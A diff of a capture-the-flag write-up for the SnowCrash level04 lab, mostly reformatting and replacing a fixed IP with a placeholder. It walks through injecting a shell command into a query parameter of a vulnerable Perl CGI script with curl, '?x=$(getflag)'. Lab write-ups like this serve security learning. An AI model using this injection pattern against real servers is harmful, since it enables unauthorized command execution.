@@ -10,7 +10,7 @@ password: *use previously found flag*
 ```bash
 level04@SnowCrash:~$ ls -l
     total 4
-	-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+    -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
 
 level04@SnowCrash:~$ cat level04.pl
 ```
@@ -23,18 +23,19 @@ The script does not filter or validate the command being executed. This creates 
 ## 3. Check if server 4747 is running
 
 ```bash
-curl 192.168.56.102:4747
+level04@SnowCrash:~$ curl <your VM's IP address>:4747
 ```
 An empty line is returned, which means that it is active.
 
 ## 4. Inject your command
 
-### Example
+Example
 ```bash
-curl 192.168.56.102:4747?x=ls
+level04@SnowCrash:~$ curl <your VM's IP address>:4747?x=ls
 ```
 
-### It will return `ls` because function `x` prints what we give as a parameter. Therefore, inject command `getflag` to get the flag
+It will return `ls` because function `x` prints what we give as a parameter.
+Therefore, inject command `getflag` to get the flag
 ```bash
-curl '192.168.56.102:4747?x=$(getflag)'
+level04@SnowCrash:~$ curl '<your VM's IP address>:4747?x=$(getflag)'
 ```
